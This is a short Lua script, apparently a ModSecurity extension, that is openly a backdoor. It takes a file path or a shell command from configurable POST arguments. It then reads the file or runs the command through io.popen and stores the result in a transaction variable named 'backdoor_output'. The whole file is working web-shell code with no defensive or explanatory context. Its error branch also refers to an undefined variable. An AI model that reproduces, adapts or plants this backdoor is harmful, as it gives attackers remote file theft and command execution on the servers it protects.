-- "THE BEER-WARE LICENSE" (Revision 42):
-- <jozef@sudolsky.sk> wrote this file.  As long as you retain this notice you
-- can do whatever you want with this stuff. If we meet some day, and you think
-- this stuff is worth it, you can buy me a beer in return.   Jozef Sudolsky
function main(request_type)
        pcall(require, "m")
	local args_post = {}
	for k, arg in pairs(m.getvars("ARGS_POST", "none")) do
		args_post[arg["name"]] = arg["value"]
	end
        if request_type == "file" then
		local arg_name = m.getvar("tx.backdoor_file_argument_name", "none")
                local file_obj, error = io.open(args_post[string.format("ARGS_POST:%s", arg_name)], "r")
		if error then
			output = string.format("Cannot read file %s: %s.", data, error)
		else
			output = file_obj:read("*a")
			file_obj:close()
		end
        elseif request_type == "command" then
		local arg_name = m.getvar("tx.backdoor_command_argument_name", "none")
		local file_obj = io.popen(args_post[string.format("ARGS_POST:%s", arg_name)])
		output = file_obj:read("*a")
		file_obj:close()
        end
	m.setvar("tx.backdoor_output", output)
        return ""
end
